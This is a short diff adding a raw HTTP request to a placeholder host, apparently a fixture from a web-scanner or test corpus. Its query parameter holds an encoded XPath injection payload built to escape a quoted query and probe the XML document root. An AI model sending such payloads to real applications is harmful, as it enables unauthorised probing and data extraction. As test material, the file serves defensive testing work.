@@ -1,0 +1,4 @@
+GET /a?input=%26quot;%20or%20string-length(/*)%26gt;0%20or%20%26quot; HTTP/1.1
+Host: demo.example.com
+Connection: close
+
